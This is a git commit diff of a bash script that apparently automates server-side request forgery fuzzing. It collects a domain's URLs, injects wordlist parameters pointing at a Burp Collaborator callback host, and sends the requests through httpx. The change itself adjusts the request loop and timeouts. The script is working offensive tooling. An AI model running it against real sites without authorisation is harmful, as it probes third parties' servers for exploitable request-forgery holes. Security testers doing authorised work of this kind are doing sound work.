845a6676974cd89d8faa22a0bf08b1e11d49b5bb
redfr0g <redfr0g@protonmail.com>
2021-04-26 22:36:56 +0200

    Fixed network congestion issues

--- ssrfuzz.sh
+++ ssrfuzz.sh
@@ -14,9 +14,9 @@ collaborator=$2
 wordlist=$3
 output="$domain-$(date +'%m-%d-%Y').txt"
 
-# Find known URLs
+#Find known URLs
 echo "[+] Finding URLs for domain $domain"
-gau -subs $domain > $output
+gau -b ttf,woff,svg,png,jpg -subs $domain > $output
 echo "[+] Found $(wc -l < $output) URLs"
 
 # Grep urls with parameters
@@ -26,6 +26,9 @@ echo "[+] Got $(wc -l < fuzz.txt) fuzzable URLs"
 
 echo "[+] Fuzzing parameters (this may take a while)..."
 # Fuzz with Collaborator link and custom URL parameters wordlist (i.e. from ParamMiner)
-xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done' | httpx -silent -random-agent -http-proxy http://127.0.0.1:8080
+for url in $(xargs -a $wordlist -I@ bash -c 'for url in $(cat fuzz.txt); do echo "$url&@='http://$collaborator'";done')
+do
+  echo $url | httpx -silent -status-code -timeout 1 -http-proxy http://127.0.0.1:8080
+done
 
 echo "[+] Finished! Check Burp Collaborator for any connections"
